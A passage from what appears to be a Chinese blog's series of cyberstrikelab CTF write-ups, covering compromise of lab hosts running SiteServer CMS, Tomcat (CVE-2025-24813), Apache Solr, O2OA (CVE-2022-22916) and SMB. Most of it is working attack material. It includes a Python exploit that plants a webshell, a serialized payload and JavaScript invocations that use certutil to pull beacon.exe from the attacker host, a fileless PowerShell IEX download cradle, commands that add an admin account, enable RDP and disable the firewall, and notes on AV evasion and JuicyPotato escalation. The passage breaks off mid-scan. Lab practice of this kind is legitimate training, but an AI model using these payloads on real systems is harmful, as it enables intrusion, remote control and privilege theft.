发现5.0版本，使用EXPhttps://github.com/jinqiwenc/we1h0r，参考https://www.freebuf.com/articles/web/195105.html，downloadUrl中修改，我这里用AI改写为python并参考https://blog.csdn.net/m0_45155797/article/details/146547256?spm=1001.2014.3001.5501做混淆 import base64from Crypto.Cipher import DESfrom Crypto.Util.Padding import paddef encrypt_des(): _encryptKey = vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5 _decryptKey = vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5 _inputString = http://172.16.233.2:8889/poxteam.zip _outString = _noteMessage = iv = bytes([0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF]) try: # Take first 8 bytes of the key (DES keys are 8 bytes) byKey = _encryptKey[:8].encode(utf-8) # Create DES cipher cipher = DES.new(byKey, DES.MODE_CBC, iv) # Pad the input data and encrypt input_bytes = _inputString.encode(utf-8) padded_input = pad(input_bytes, DES.block_size) encrypted_bytes = cipher.encrypt(padded_input) # Base64 encode the result _outString = base64.b64encode(encrypted_bytes).decode(utf-8) print(DesEncrypt:) print(_outString.replace(+, 0add0).replace(=, 0equals0).replace(, 0and0).replace(?, 0question0).replace(/, 0slash0)) except Exception as error: _noteMessage = str(error) print(_noteMessage)if __name__ == __main__: encrypt_des() (base) SSCMS python3 downloadUrl.pyFound existing alias for python3. You should use: pDesEncrypt:ZjYIub0slash0YxA0OSS4eOKgBeZukCdTt5b7yrrLZ3p7c0add00slash0MhpTjmIIN6ow0equals00equals0 http://192.168.1.16/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownloaduserKeyPrefix=testdownloadUrl=ZjYIub0slash0YxA0OSS4eOKgBeZukCdTt5b7yrrLZ3p7c0add00slash0MhpTjmIIN6ow0equals00equals0directoryName=sectest 这里我修改了两个poc变为 import base64from Crypto.Cipher import DESfrom Crypto.Util.Padding import padimport sysimport argparseimport requestsimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)def send_payload(target, downloadUrl): payload = [r/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownloaduserKeyPrefix=testdownloadUrl=+downloadUrl+rdirectoryName=sectest] # print(payload) targets = target + payload[0] header_list = User-Agent:Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0, try: request = requests.get(target, verify=False) if request.status_code == 404: print([-] 404 not found + target) else: results = requests.get(targets, headers=header_list, timeout=3, verify=False).text r = requests.get(targets, verify=False, timeout=6).text if 站点模板下载成功，请到站点模板管理中查看。 in r: print([+] exists vulnerability ) print(WebShell: + target + /SiteFiles/SiteTemplates/sectest/include.aspx) print(PassWord:admin) else: print([-] dont exists + target) except requests.ConnectionError: print([-] Cannot connect url + target)def read_url_list(files): with open(files, r, encoding=utf-8) as f: for line in f: send_payload(line.strip())def encrypt_des(poxteam_addr): _encryptKey = vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5 _decryptKey = vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5 # _inputString = http://172.16.233.2:8889/poxteam.zip _inputString = poxteam_addr print([*] Input String:, _inputString) _outString = _noteMessage = iv = bytes([0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF]) try: # Take first 8 bytes of the key (DES keys are 8 bytes) byKey = _encryptKey[:8].encode(utf-8) # Create DES cipher cipher = DES.new(byKey, DES.MODE_CBC, iv) # Pad the input data and encrypt input_bytes = _inputString.encode(utf-8) padded_input = pad(input_bytes, DES.block_size) encrypted_bytes = cipher.encrypt(padded_input) # Base64 encode the result _outString = base64.b64encode(encrypted_bytes).decode(utf-8) print(DesEncrypt:) result = _outString.replace(+, 0add0).replace(=, 0equals0).replace(, 0and0).replace(?, 0question0).replace(/, 0slash0) print(result) return result except Exception as error: _noteMessage = str(error) print(_noteMessage) sys.exit(0)def main(): print( [*] Start Check... ) # Set up argument parser parser = argparse.ArgumentParser(description=Script to process URLs) parser.add_argument(-s, --str, required=True, help=Target URL or file containing URLs) parser.add_argument(-u, --url, help=Process single URL) parser.add_argument(-f, --file, help=Process file containing URLs) args = parser.parse_args() print([*] Exploit url:, args.url) downloadUrl = encrypt_des(args.str) if args.url: send_payload(args.url, downloadUrl) elif args.file: read_url_list(args.file) else: print([-] Please specify either -u for single URL or -f for URL list) sys.exit(1)if __name__ == __main__: main() 在poxteam.zip目录运行 (base) webshell [main●] p -m http.server 8889Serving HTTP on :: port 8889 (http://[::]:8889/) ...::ffff:172.16.233.2 - - [23/Jul/2025 17:47:26] GET /poxteam.zip HTTP/1.1 200 -::ffff:172.16.233.2 - - [23/Jul/2025 17:47:26] code 404, message File not found::ffff:172.16.233.2 - - [23/Jul/2025 17:47:26] GET /poxteam.zip/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownloaduserKeyPrefix=testdownloadUrl=ZjYIub0slash0YxA0OSS4eOKgBeZukCdTt5b7yrrLZ3p7c0add00slash0MhpTjmIIN6ow0equals00equals0directoryName=sectest HTTP/1.1 404 -::ffff:172.16.233.2 - - [23/Jul/2025 17:47:26] code 404, message File not found::ffff:172.16.233.2 - - [23/Jul/2025 17:47:26] GET /poxteam.zip/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownloaduserKeyPrefix=testdownloadUrl=ZjYIub0slash0YxA0OSS4eOKgBeZukCdTt5b7yrrLZ3p7c0add00slash0MhpTjmIIN6ow0equals00equals0directoryName=sectest HTTP/1.1 404 -::ffff:172.16.233.2 - - [23/Jul/2025 17:47:29] GET /poxteam.zip HTTP/1.1 200 -^[[A::ffff:192.168.1.16 - - [23/Jul/2025 17:49:59] GET /poxteam.zip HTTP/1.1 200 -::ffff:192.168.1.16 - - [23/Jul/2025 17:49:59] GET /poxteam.zip HTTP/1.1 200 - 执行即可getshell (base) SSCMS python3 downloadUrl.py -s http://172.16.233.2:8889/poxteam.zip -u http://192.168.1.16/Found existing alias for python3. You should use: p[*] Start Check...[*] Exploit url: http://192.168.1.16/[*] Input String: http://172.16.233.2:8889/poxteam.zipDesEncrypt:ZjYIub0slash0YxA0OSS4eOKgBeZukCdTt5b7yrrLZ3p7c0add00slash0MhpTjmIIN6ow0equals00equals0[+] exists vulnerabilityWebShell: http://192.168.1.16//SiteFiles/SiteTemplates/sectest/include.aspxPassWord:admin 访问即可使用大马，分离免杀后JuicyPotato直接提权成功 要用badpotato的马才能读取","tags":["分离免杀","siteserver"]},{"title":"cyberstrikelab PRIV-4","path":"/2025/07/23/PRIV-4/","content":"PRIV-4 靶机ip: 10.0.0.9 攻击机ip: 172.16.233.2 信息收集(base) Downloads fscan2 -h 10.0.0.9 -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[531ms] 已选择服务扫描模式[531ms] 开始信息扫描[532ms] 最终有效主机数量: 1[532ms] 开始主机扫描[532ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[535ms] 有效端口数量: 65535[612ms] [*] 端口开放 10.0.0.9:445[762ms] [*] 端口开放 10.0.0.9:135[775ms] [*] 端口开放 10.0.0.9:139[2.9s] [*] 端口开放 10.0.0.9:5040[4.2s] [*] 端口开放 10.0.0.9:7680[4.3s] [*] 端口开放 10.0.0.9:8009[4.3s] [*] 端口开放 10.0.0.9:8080[23.5s] [*] 端口开放 10.0.0.9:49664[23.5s] [*] 端口开放 10.0.0.9:49670[23.5s] [*] 端口开放 10.0.0.9:49669[23.5s] [*] 端口开放 10.0.0.9:49667[23.5s] [*] 端口开放 10.0.0.9:49668[23.5s] [*] 端口开放 10.0.0.9:49666[23.5s] [*] 端口开放 10.0.0.9:49665[31.7s] 扫描完成, 发现 14 个开放端口[31.7s] 存活端口数量: 14[31.7s] 开始漏洞扫描[31.8s] POC加载完成: 总共387个，成功387个，失败0个[31.9s] [*] NetInfo 扫描结果目标主机: 10.0.0.9主机名: DESKTOP-0HF3N8K发现的网络接口: IPv4地址: └─ 10.0.0.9[31.9s] [+] 10.0.0.9 CVE-2020-0796 SmbGhost Vulnerable[32.1s] [+] SMB认证成功 10.0.0.9:445 administrator:123456[32.6s] SMB2共享信息 10.0.0.9:445 administrator Pass:123456 共享:[ADMIN$ C$ IPC$][32.6s] [+] SMB2认证成功 10.0.0.9:445 administrator Pass:123456[33.8s] [*] 网站标题 http://10.0.0.9:8080 状态码:200 长度:11432 标题:Apache Tomcat/8.5.19 直接smb登录即可获取flag (base) examples [master●] python3 psexec.py administrator:123456@10.0.0.9Found existing alias for python3. You should use: p/opt/anaconda3/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools81. import pkg_resourcesImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Requesting shares on 10.0.0.9.....[*] Found writable share ADMIN$[*] Uploading file KAGmDAqd.exe[*] Opening SVCManager on 10.0.0.9.....[*] Creating service WOTy on 10.0.0.9.....[*] Starting service WOTy.....[!] Press help for extra shell commands[-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codecMicrosoft Windows [�汾 10.0.18362.30][-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codec(c) 2019 Microsoft Corporation����������Ȩ����C:\\Windows\\system32 chcp 65001Active code page: 65001C:\\Windows\\system32 cd C:\\C:\\ dir Volume in drive C has no label. Volume Serial Number is D6E3-DF66 Directory of C:\\2024/12/24 12:18 45 flag.txt2019/03/19 12:52 DIR PerfLogs2024/12/24 11:26 DIR Program Files2019/03/19 19:46 DIR Program Files (x86)2025/01/01 06:27 DIR Users2025/07/23 15:51 DIR Windows 1 File(s) 45 bytes 5 Dir(s) 3,984,150,528 bytes freeC:\\ type flag.txtgo-flag95adf51d-9b66-4e94-9dbc-333b69d5bdbf","tags":["smb"]},{"title":"cyberstrikelab pt-24","path":"/2025/07/23/pt-24/","content":"pt-24 靶机ip: 10.0.0.10 攻击机ip: 172.16.233.2 shiro默认key","tags":["shiro默认key"]},{"title":"cyberstrikelab pt-15","path":"/2025/07/22/pt-15/","content":"pt-15信息收集在首页发现是thinkphp 5版本 (base) Downloads fscan2 -h 10.0.0.11┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[565ms] 已选择服务扫描模式[565ms] 开始信息扫描[565ms] 最终有效主机数量: 1[565ms] 开始主机扫描[565ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[565ms] 有效端口数量: 233[612ms] [*] 端口开放 10.0.0.11:80[613ms] [*] 端口开放 10.0.0.11:445[628ms] [*] 端口开放 10.0.0.11:3306[630ms] [*] 端口开放 10.0.0.11:135[633ms] [*] 端口开放 10.0.0.11:139[710ms] 扫描完成, 发现 5 个开放端口[710ms] 存活端口数量: 5[710ms] 开始漏洞扫描[725ms] POC加载完成: 总共387个，成功387个，失败0个[825ms] [*] NetInfo 扫描结果目标主机: 10.0.0.11主机名: WIN-BCQDCARVJPJ发现的网络接口: IPv4地址: └─ 10.0.0.11[1.1s] [*] 网站标题 http://10.0.0.11 状态码:200 长度:931 标题:无标题 thinkphp5-rce 可以执行命令，这里发现不用提权直接能读flag","tags":["thinkphp5-rce"]},{"title":"cyberstrikelab pt-19","path":"/2025/07/22/pt-19/","content":"pt-19 靶机ip: 10.10.10.3 攻击机ip: 172.16.233.2 CVE_2025_24813版本是9.0.98 PUT /cc/session HTTP/1.1Host: 10.10.10.3Content-Length: 3803Content-Range: bytes 0-1000/1200base64dec(rO0ABXNyACLBqsGhwbbBocCuwbXBtMGpwazArsGIwaHBs8GowY3BocGwBQfawcMWYNEDAAJGABTBrMGvwaHBpMGGwaHBo8G0wa/BskkAEsG0wajBssGlwbPBqMGvwazBpHhwP0AAAAAAAAx3CAAAABAAAAABc3IAaMGvwbLBp8CuwaHBsMGhwaPBqMGlwK7Bo8Gvwa3BrcGvwa7Bs8CuwaPBr8GswazBpcGjwbTBqcGvwa7Bs8CuwavBpcG5wbbBocGswbXBpcCuwZTBqcGlwaTBjcGhwbDBhcGuwbTBssG5iq3SmznBH9sCAAJMAAbBq8Glwbl0ACTBjMGqwaHBtsGhwK/BrMGhwa7Bp8CvwY/BosGqwaXBo8G0wLtMAAbBrcGhwbB0AB7BjMGqwaHBtsGhwK/BtcG0wanBrMCvwY3BocGwwLt4cHNyAHTBo8Gvwa3ArsGzwbXBrsCuwa/BssGnwK7BocGwwaHBo8GowaXArsG4waHBrMGhwa7ArsGpwa7BtMGlwbLBrsGhwazArsG4wbPBrMG0waPArsG0wbLBocG4wK7BlMGlwa3BsMGswaHBtMGlwbPBicGtwbDBrAlXT8FurKszAwAGSQAawZ/BqcGuwaTBpcGuwbTBjsG1wa3BosGlwbJJABzBn8G0wbLBocGuwbPBrMGlwbTBicGuwaTBpcG4WwAUwZ/BosG5wbTBpcGjwa/BpMGlwbN0AAbBm8GbwYJbAAzBn8GjwazBocGzwbN0ACTBm8GMwarBocG2waHAr8GswaHBrsGnwK/Bg8GswaHBs8GzwLtMAArBn8GuwaHBrcGldAAkwYzBqsGhwbbBocCvwazBocGuwafAr8GTwbTBssGpwa7Bp8C7TAAiwZ/Br8G1wbTBsMG1wbTBkMGywa/BsMGlwbLBtMGpwaXBs3QALMGMwarBocG2waHAr8G1wbTBqcGswK/BkMGywa/BsMGlwbLBtMGpwaXBs8C7eHAAAAAA/////3VyAAbBm8GbwYJL/RkVZ2fbNwIAAHhwAAAAAnVyAATBm8GCrPMX+AYIVOACAAB4cAAABFbK/rq+AAAANABECgAQACUIACYJACcAKAgAKQoABgAqBwArCAAsCAAtCAAdCAAuCgAvADAKAC8AMQcAMgoADQAzBwA0BwA1AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABVMcGF5bG9hZC9SdW50aW1lRXhlYzsBAAg8Y2xpbml0PgEABHZhcjEBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAEdmFyMwEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHACsHABoHADIBAApTb3VyY2VGaWxlAQAQUnVudGltZUV4ZWMuamF2YQwAEQASAQBWY21kIC9jIGNlcnR1dGlsLmV4ZSAtdXJsY2FjaGUgLXNwbGl0IC1mIGh0dHA6Ly8xNzIuMTYuMjMzLjI6ODg4OS9iZWFjb24uZXhlIGJlYWNvbi5leGUHADYMADcAHgEAAS8MADgAOQEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAIvQwcAOgwAOwA8DAA9AD4BABNqYXZhL2lvL0lPRXhjZXB0aW9uDAA/ABIBAAhObkFleG13QgEAEGphdmEvbGFuZy9PYmplY3QBAAxqYXZhL2lvL0ZpbGUBAAlzZXBhcmF0b3IBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAEAMABEAEgoAQQBCACEADwBBAAAAAAACAAEAEQASAAEAEwAAAC8AAQABAAAABSq3AEOxAAAAAgAUAAAABgABAAAABQAVAAAADAABAAAABQAWABcAAAAIABgAEgABABMAAADTAAQAAwAAAEgSAkuyAAMSBLYABZkAGQa9AAZZAxIHU1kEEghTWQUqU0ynABYGvQAGWQMSCVNZBBIKU1kFKlNMuAALK7YADFenAAhNLLYADrEAAQA3AD8AQgANAAMAFAAAACYACQAAAAcAAwAJAA4ACgAkAAwANwAPAD8AEgBCABAAQwARAEcAEwAVAAAAKgAEACEAAwAZABoAAQBDAAQAGwAcAAIAAwBEAB0AHgAAADcAEAAZABoAAQAfAAAAFQAE/AAkBwAg/AASBwAhSgcAIvkABAABACMAAAACACR1cQB+AA4AAADyyv66vgAAADEAEwEAA0ZvbwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAIRm9vLmphdmEBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQcABwEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBXHmae48bUcYAQANQ29uc3RhbnRWYWx1ZQEABjxpbml0PgEAAygpVgwADgAPCgAEABABAARDb2RlACEAAgAEAAEACAABABoACQAKAAEADQAAAAIACwABAAEADgAPAAEAEgAAABEAAQABAAAABSq3ABGxAAAAAAABAAUAAAACAAZwdAACwZBwdwEAeHNyAFTBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/BrMGswaXBo8G0wanBr8GuwbPArsGtwaHBsMCuwYzBocG6wbnBjcGhwbBu5ZSCnnkQlAMAAUwADsGmwaHBo8G0wa/BssG5dABYwYzBr8GywafAr8GhwbDBocGjwajBpcCvwaPBr8Gtwa3Br8GuwbPAr8Gjwa/BrMGswaXBo8G0wanBr8GuwbPAr8GUwbLBocGuwbPBpsGvwbLBrcGlwbLAu3hwc3IAdMGvwbLBp8CuwaHBsMGhwaPBqMGlwK7Bo8Gvwa3BrcGvwa7Bs8CuwaPBr8GswazBpcGjwbTBqcGvwa7Bs8CuwabBtcGuwaPBtMGvwbLBs8CuwYnBrsG2wa/Bq8GlwbLBlMGywaHBrsGzwabBr8Gywa3BpcGyh+j/a3t8zjgCAANbAArBqcGBwbLBp8GzdAAmwZvBjMGqwaHBtsGhwK/BrMGhwa7Bp8CvwY/BosGqwaXBo8G0wLtMABbBqcGNwaXBtMGowa/BpMGOwaHBrcGlcQB+AAlbABbBqcGQwaHBssGhwa3BlMG5wbDBpcGzcQB+AAh4cHVyACbBm8GMwarBocG2waHArsGswaHBrsGnwK7Bj8GiwarBpcGjwbTAu5DOWJ8QcylsAgAAeHAAAAAAdAAcwa7BpcG3wZTBssGhwa7Bs8Gmwa/BssGtwaXBsnVyACTBm8GMwarBocG2waHArsGswaHBrsGnwK7Bg8GswaHBs8GzwLurFteuy81amQIAAHhwAAAAAHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAACwbR4) GET / HTTP/1.1Host: 10.10.10.3Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://mitm/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=.cc 直接上线获得LOCAL SERVICE权限，可以直接juicypotato提权","tags":["CVE_2025_24813"]},{"title":"cyberstrikelab pt-23","path":"/2025/07/22/pt-23/","content":"pt-23 靶机ip: 10.0.0.9 攻击机ip: 172.16.233.2 信息收集登录账号密码测试为cslab/123456，但是没有高权限账号，打不了CVE-2024-21683 CVE-2022-26134扫描出CVE-2022-26134 直接利用","tags":["CVE-2022-26134"]},{"title":"cyberstrikelab pt-20","path":"/2025/07/22/pt-20/","content":"pt-20 靶机ip: 10.0.0.6 攻击机ip: 172.16.233.2 信息收集这里等solr启动还要一会，然后80直接访问solr，一般是8983 https://github.com/jas502n/solr_rce?tab=readme-ov-file 使用这里的exp来打 solr(base) solr_rce [master] python2 solr_rce.py http://10.0.0.6 whoami _ _____ _ _____ _____ ______ /\\ | | / ____| | | | __ \\ / ____| ____| / \\ _ __ __ _ ___| |__ ___ | (___ ___ | |_ __ | |__) | | | |__ / /\\ \\ | _ \\ / _` |/ __| _ \\ / _ \\ \\___ \\ / _ \\| | __| | _ /| | | __| / ____ \\| |_) | (_| | (__| | | | __/ ____) | (_) | | | | | \\ \\| |____| |____ /_/ \\_\\ .__/ \\__,_|\\___|_| |_|\\___| |_____/ \\___/|_|_| |_| \\_\\_____|______| | | |_| Apache Solr Velocity模板远程代码执行 2019-10-30 17:30 python By Jas502n[+] Querying Core Name: http://10.0.0.6/solr/admin/cores?indexInfo=falsewt=jsonhttp://10.0.0.6/solr/cslab/config[+] maybe enable Successful! [+] Exp Send Successful! ____________________________________________________________http://10.0.0.6/solr/cslab/select?q=1wt=velocityv.template=customv.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end 0 win-ppdpadg72cc\\administrator 发现是administrator权限，这里用certutil下载失败，然后powershell (base) SolrExp [master●] python2 exp.py http://10.0.0.6 powershell -command Invoke-WebRequest -Uri http://172.16.233.2:8889/1.exe -OutFile C:/solr-8.2.0/server/1.exe 下载倒是成功，但是执行失败，tasklist卡半天，尝试直接远程桌面上线 (base) SolrExp [master●] python2 exp.py http://10.0.0.6 cmd /c REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /fApache Solr Template 0day Exploit by k8gegename is cslabUpconfig: http://10.0.0.6/solr/cslab/configExecCmd: 0 ²Ù×÷³É¹¦Íê³É¡£(base) SolrExp [master●] python2 exp.py http://10.0.0.6 cmd /c net user cc Admin@123 /addApache Solr Template 0day Exploit by k8gegename is cslabUpconfig: http://10.0.0.6/solr/cslab/configExecCmd: 0 ÃüÁî³É¹¦Íê³É¡£(base) SolrExp [master●] python2 exp.py http://10.0.0.6 cmd /c net localgroup Administrators cc /addApache Solr Template 0day Exploit by k8gegename is cslabUpconfig: http://10.0.0.6/solr/cslab/configExecCmd: 0 ÃüÁî³É¹¦Íê³É¡£(base) SolrExp [master●] python2 exp.py http://10.0.0.6 cmd /c netsh firewall set opmode disableApache Solr Template 0day Exploit by k8gegename is cslabUpconfig: http://10.0.0.6/solr/cslab/configExecCmd: 0ÖØÒªÐÅÏ¢: ÒÑ³É¹¦Ö´ÐÐÃüÁî¡£µ«ÊÇ£¬netsh firewall ÒÑÆúÓÃ£»Çë¸ÄÓÃ netsh advfirewall firewall ¡£ÓÐ¹ØÊ¹ÓÃ netsh advfirewall firewall ÃüÁî¶ø·Ç netsh firewall µÄÏêÏ¸ÐÅÏ¢£¬Çë²ÎÔÄ https://go.microsoft.com/fwlink/?linkid=121488 ÉÏµÄ KB ÎÄÕÂ 947709¡£È·¶¨¡£ 远程桌面进去运行exe，以管理员身份运行","tags":["solr-8.2.0-rce"]},{"title":"cyberstrikelab pt-10","path":"/2025/07/21/pt-10/","content":"pt-10信息收集进入发现系统为O2OA，有RCE漏洞，使用xadmin/o2登录 CVE-2022-22916POST /x_program_center/jaxrs/invoke?v=6.3 HTTP/1.1Host: 10.0.0.56Accept: text/html, application/xml, text/xml, */*X-Requested-With: XMLHttpRequestAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36Referer: http://10.0.0.56/x_desktop/index.htmlAccept-Encoding: gzip, deflate, brCookie: x-token=PfyuxmzgIzq901fHOnMMjqCE2g1wjyhz50QnO7mEHhAConnection: keep-aliveContent-Type: application/json; charset=UTF-8Content-Length: 567id:cg,name:cg,enableToken:false,alias:,description:,validated:true,enable:true,text:var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\\whoami\\).getInputStream())); var result = []; while (true) var oneline = bufReader.readLine(); result.push(oneline); if (!oneline) break; var result = \\Result\\: result ; this.response.setBody(result, \\application/json\\); ,remoteAddrRegex:,createTime:2022-08-27 04:39:18,updateTime:2022-08-27 04:39:18 查看执行结果 POST /x_program_center/jaxrs/invoke/cccb/execute HTTP/1.1Host: 10.0.0.56Accept: text/html, application/xml, text/xml, */*X-Requested-With: XMLHttpRequestAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36Referer: http://10.0.0.56/x_desktop/index.htmlAccept-Encoding: gzip, deflate, brOrigin: http://123.58.236.76:43953Referer: http://123.58.236.76:43953/x_desktop/index.htmlCookie: x-token=PfyuxmzgIzq901fHOnMMjqCE2g1wjyhz50QnO7mEHhAConnection: keep-aliveAccept: text/html,application/json,*/*Content-Length: 0 发现是windows主机 id:bd,name:bd,enableToken:false,alias:,description:,validated:true,enable:true,text:var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\\certutil.exe -urlcache -split -f http://172.16.233.2:8889/fenli.exe C:/Users/fenli.exe\\).getInputStream())); var result = []; while (true) var oneline = bufReader.readLine(); result.push(oneline); if (!oneline) break; var result = \\Result\\: result ; this.response.setBody(result, \\application/json\\); ,remoteAddrRegex:,createTime:2022-08-27 04:39:18,updateTime:2022-08-27 04:39:18 id:be,name:be,enableToken:false,alias:,description:,validated:true,enable:true,text:var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\\certutil.exe -urlcache -split -f http://172.16.233.2:8889/360.ini C:/Users/360.ini\\).getInputStream())); var result = []; while (true) var oneline = bufReader.readLine(); result.push(oneline); if (!oneline) break; var result = \\Result\\: result ; this.response.setBody(result, \\application/json\\); ,remoteAddrRegex:,createTime:2022-08-27 04:39:18,updateTime:2022-08-27 04:39:18 发现写不进去，看下当前目录 id:bag,name:bag,enableToken:false,alias:,description:,validated:true,enable:true,text:var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\\cmd /c cd\\).getInputStream())); var result = []; while (true) var oneline = bufReader.readLine(); result.push(oneline); if (!oneline) break; var result = \\Result\\: result ; this.response.setBody(result, \\application/json\\); ,remoteAddrRegex:,createTime:2022-08-27 04:39:18,updateTime:2022-08-27 04:39:18 C:\\\\Windows\\\\system32 id:bba,name:bba,enableToken:false,alias:,description:,validated:true,enable:true,text:var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\\cmd /c certutil.exe -urlcache -split -f http://172.16.233.2:8889/beacon.exe C:/Windows/system32/beacon.exe\\).getInputStream())); var result = []; while (true) var oneline = bufReader.readLine(); result.push(oneline); if (!oneline) break; var result = \\Result\\: result ; this.response.setBody(result, \\application/json\\); ,remoteAddrRegex:,createTime:2022-08-27 04:39:18,updateTime:2022-08-27 04:39:18 找半天文件写不进去，直接打powershell无文件马 name:fb,id:fa,alias:,description:,isNewInvoke:true,text: var s = [6]; s[0] = \\powershell\\; s[1] = \\-nop\\; s[2] = \\-w\\; s[3] = \\hidden\\; s[4] = \\-c\\; s[5] = \\IEX ((new-object net.webclient).downloadstring(http://172.16.233.2:8889/beacon.ps1))\\; var p = java.lang.Runtime.getRuntime().exec(s); var sc = new java.util.Scanner(p.getInputStream(),\\GBK\\).useDelimiter(\\\\\\\\\\A\\); var result = sc.hasNext() ? sc.next() : \\\\; sc.close();,enableToken:false,enable:true,remoteAddrRegex:,lastStartTime:,lastEndTime:,validated:true juicypotato提权然后juicypotato直接提权结束","tags":["juicypotato提权","CVE-2022-22916"]},{"title":"cyberstrikelab pt-12","path":"/2025/07/21/pt-12/","content":"pt-12信息收集(base) Downloads fscan2 -h 10.0.0.24 -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[527ms] 已选择服务扫描模式[527ms] 开始信息扫描[527ms] 最终有效主机数量: 1[527ms] 开始主机扫描[527ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, 